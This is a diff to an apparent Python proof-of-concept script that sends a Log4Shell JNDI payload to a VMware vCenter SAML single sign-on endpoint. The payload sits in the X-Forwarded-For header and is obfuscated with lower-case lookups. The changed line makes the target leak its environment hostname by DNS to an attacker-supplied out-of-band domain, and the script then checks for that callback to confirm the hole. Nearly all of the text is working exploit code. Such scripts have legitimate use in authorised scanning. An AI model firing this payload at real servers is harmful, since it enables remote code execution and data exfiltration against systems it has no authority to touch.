@@ -44,7 +44,7 @@ def poc(url):
         path = """/websso/SAML2/SSO/vsphere.local?SAMLRequest="""
         method = "GET"
         data = """"""
-        headers = {'X-Forwarded-For': '${jndi:${lower:d}n${lower:s}://${env:hostName}.oob_domain}'}
+        headers = {'X-Forwarded-For': '${jndi:${lower:d}n${lower:s}://${env:hostName}.%s}' % oob_domain}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if verify_request(type="dns", flag=flag):
